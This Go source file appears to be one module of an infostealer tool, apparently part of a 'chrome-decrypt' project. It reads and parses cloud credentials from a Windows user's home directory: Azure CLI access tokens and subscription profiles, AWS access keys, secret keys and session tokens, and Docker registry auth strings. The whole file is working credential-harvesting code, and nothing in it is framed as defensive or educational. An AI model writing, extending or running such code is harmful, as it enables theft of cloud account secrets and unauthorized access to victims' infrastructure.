package cloud

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"chrome-decrypt/pkg/credentials"
)

// Extractor implements the credentials.Extractor interface
type Extractor struct {
	verbose bool
}

// NewExtractor creates a new cloud credentials extractor
func NewExtractor(verbose bool) *Extractor {
	return &Extractor{verbose: verbose}
}

// Extract extracts cloud service credentials (Azure, AWS, Docker, etc.)
func (e *Extractor) Extract() (interface{}, error) {
	if e.verbose {
		fmt.Println("[*] Extracting cloud credentials...")
	}

	var creds []credentials.AppCredential

	// Extract Azure CLI credentials
	if azureCreds := e.extractAzureCredentials(); len(azureCreds) > 0 {
		creds = append(creds, azureCreds...)
	}

	// Extract AWS credentials
	if awsCreds := e.extractAWSCredentials(); len(awsCreds) > 0 {
		creds = append(creds, awsCreds...)
	}

	// Extract Docker credentials
	if dockerCreds := e.extractDockerCredentials(); len(dockerCreds) > 0 {
		creds = append(creds, dockerCreds...)
	}

	if e.verbose {
		fmt.Printf("[+] Found %d cloud credential entries\n", len(creds))
	}
	return creds, nil
}

// GetType returns the extractor type
func (e *Extractor) GetType() string {
	return "cloud_credentials"
}

// extractAzureCredentials extracts Azure CLI and PowerShell credentials
func (e *Extractor) extractAzureCredentials() []credentials.AppCredential {
	var creds []credentials.AppCredential

	userHome := os.Getenv("USERPROFILE")

	// Azure CLI credentials
	azurePath := filepath.Join(userHome, ".azure")
	if _, err := os.Stat(azurePath); err == nil {
		// Check accessTokens.json
		tokensPath := filepath.Join(azurePath, "accessTokens.json")
		if data, err := os.ReadFile(tokensPath); err == nil {
			cred := credentials.AppCredential{
				Application: "Azure CLI",
				AccountName: "Access Tokens",
				Token:       string(data),
				Extra: map[string]string{
					"file_path": tokensPath,
				},
			}
			creds = append(creds, cred)
		}

		// Check azureProfile.json
		profilePath := filepath.Join(azurePath, "azureProfile.json")
		if data, err := os.ReadFile(profilePath); err == nil {
			if azureCreds := e.parseAzureProfile(string(data)); len(azureCreds) > 0 {
				creds = append(creds, azureCreds...)
			}
		}
	}

	return creds
}

// parseAzureProfile parses Azure profile JSON for subscription information
func (e *Extractor) parseAzureProfile(profileContent string) []credentials.AppCredential {
	var creds []credentials.AppCredential

	var profile struct {
		Subscriptions []struct {
			ID                string `json:"id"`
			Name              string `json:"name"`
			TenantID          string `json:"tenantId"`
			User              struct {
				Name string `json:"name"`
				Type string `json:"type"`
			} `json:"user"`
		} `json:"subscriptions"`
	}

	if err := json.Unmarshal([]byte(profileContent), &profile); err != nil {
		return creds
	}

	for _, sub := range profile.Subscriptions {
		cred := credentials.AppCredential{
			Application: "Azure Subscription",
			AccountName: sub.Name,
			Username:    sub.User.Name,
			Extra: map[string]string{
				"subscription_id": sub.ID,
				"tenant_id":       sub.TenantID,
				"user_type":       sub.User.Type,
			},
		}
		creds = append(creds, cred)
	}

	return creds
}

// extractAWSCredentials extracts AWS CLI and SDK credentials
func (e *Extractor) extractAWSCredentials() []credentials.AppCredential {
	var creds []credentials.AppCredential

	userHome := os.Getenv("USERPROFILE")
	awsPath := filepath.Join(userHome, ".aws")

	if _, err := os.Stat(awsPath); os.IsNotExist(err) {
		return creds
	}

	// Check credentials file
	credentialsPath := filepath.Join(awsPath, "credentials")
	if data, err := os.ReadFile(credentialsPath); err == nil {
		if awsCreds := e.parseAWSCredentials(string(data)); len(awsCreds) > 0 {
			creds = append(creds, awsCreds...)
		}
	}

	// Check config file
	configPath := filepath.Join(awsPath, "config")
	if data, err := os.ReadFile(configPath); err == nil {
		if awsConfigs := e.parseAWSConfig(string(data)); len(awsConfigs) > 0 {
			creds = append(creds, awsConfigs...)
		}
	}

	return creds
}

// parseAWSCredentials parses AWS credentials file
func (e *Extractor) parseAWSCredentials(credContent string) []credentials.AppCredential {
	var creds []credentials.AppCredential
	var currentProfile credentials.AppCredential

	lines := strings.Split(credContent, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)

		if strings.HasPrefix(line, "[") && strings.HasSuffix(line, "]") {
			if currentProfile.AccountName != "" {
				creds = append(creds, currentProfile)
			}
			currentProfile = credentials.AppCredential{
				Application: "AWS Credentials",
				AccountName: strings.Trim(line, "[]"),
				Extra:       make(map[string]string),
			}
		} else if strings.Contains(line, "=") {
			parts := strings.Split(line, "=")
			if len(parts) == 2 {
				key := strings.TrimSpace(parts[0])
				value := strings.TrimSpace(parts[1])

				// Initialize Extra map if nil
				if currentProfile.Extra == nil {
					currentProfile.Extra = make(map[string]string)
				}

				switch key {
				case "aws_access_key_id":
					currentProfile.Username = value
				case "aws_secret_access_key":
					currentProfile.Password = value
				case "aws_session_token":
					currentProfile.Token = value
				default:
					currentProfile.Extra[key] = value
				}
			}
		}
	}

	if currentProfile.AccountName != "" {
		creds = append(creds, currentProfile)
	}

	return creds
}

// parseAWSConfig parses AWS config file
func (e *Extractor) parseAWSConfig(configContent string) []credentials.AppCredential {
	var creds []credentials.AppCredential
	var currentProfile credentials.AppCredential

	lines := strings.Split(configContent, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)

		if strings.HasPrefix(line, "[") && strings.HasSuffix(line, "]") {
			if currentProfile.AccountName != "" {
				creds = append(creds, currentProfile)
			}
			profileName := strings.Trim(line, "[]")
			profileName = strings.TrimPrefix(profileName, "profile ")
			currentProfile = credentials.AppCredential{
				Application: "AWS Config",
				AccountName: profileName,
				Extra:       make(map[string]string),
			}
		} else if strings.Contains(line, "=") {
			parts := strings.Split(line, "=")
			if len(parts) == 2 {
				key := strings.TrimSpace(parts[0])
				value := strings.TrimSpace(parts[1])
				
				// Initialize Extra map if nil
				if currentProfile.Extra == nil {
					currentProfile.Extra = make(map[string]string)
				}
				
				currentProfile.Extra[key] = value
			}
		}
	}

	if currentProfile.AccountName != "" {
		creds = append(creds, currentProfile)
	}

	return creds
}

// extractDockerCredentials extracts Docker Hub and registry credentials
func (e *Extractor) extractDockerCredentials() []credentials.AppCredential {
	var creds []credentials.AppCredential

	userHome := os.Getenv("USERPROFILE")
	dockerConfigPath := filepath.Join(userHome, ".docker", "config.json")

	if data, err := os.ReadFile(dockerConfigPath); err == nil {
		if dockerCreds := e.parseDockerConfig(string(data)); len(dockerCreds) > 0 {
			creds = append(creds, dockerCreds...)
		}
	}

	return creds
}

// parseDockerConfig parses Docker configuration file
func (e *Extractor) parseDockerConfig(configContent string) []credentials.AppCredential {
	var creds []credentials.AppCredential

	var config struct {
		Auths map[string]struct {
			Auth  string `json:"auth"`
			Email string `json:"email"`
		} `json:"auths"`
		CredHelpers map[string]string `json:"credHelpers"`
	}

	if err := json.Unmarshal([]byte(configContent), &config); err != nil {
		return creds
	}

	for registry, auth := range config.Auths {
		cred := credentials.AppCredential{
			Application: "Docker Registry",
			Server:      registry,
			Email:       auth.Email,
			Token:       auth.Auth, // Base64 encoded username:password
			Extra:       make(map[string]string),
		}

		if helper, exists := config.CredHelpers[registry]; exists {
			cred.Extra["credential_helper"] = helper
		}

		creds = append(creds, cred)
	}

	return creds
}
